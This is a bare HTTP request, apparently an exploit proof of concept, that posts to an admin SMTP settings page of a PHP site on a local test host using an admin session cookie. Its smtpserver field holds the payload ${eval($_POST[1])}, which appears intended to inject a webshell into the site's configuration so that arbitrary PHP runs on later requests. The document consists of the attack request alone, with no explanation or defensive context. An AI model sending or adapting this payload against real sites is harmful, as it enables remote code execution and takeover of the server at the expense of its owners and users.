```
POST /at1fcg/admin_smtp.php?action=set HTTP/1.1
Host: 127.0.0.12
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 192
Origin: http://127.0.0.12
Connection: close
Referer: http://127.0.0.12/at1fcg/admin_smtp.php
Cookie: PHPSESSID=rcejd2jps1jcrv8gdoumqmf71k
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=4

smtpserver=${eval($_POST[1])}&smtpserverport=&smtpusermail=12345%40qq.com&smtpname=%E6%B5%B7%E6%B4%8B%E5%BD%B1%E8%A7%86%E7%BD%91&smtpuser=12345%40qq.com&smtppass=123456789&smtpreg=off&smtppsw=
```

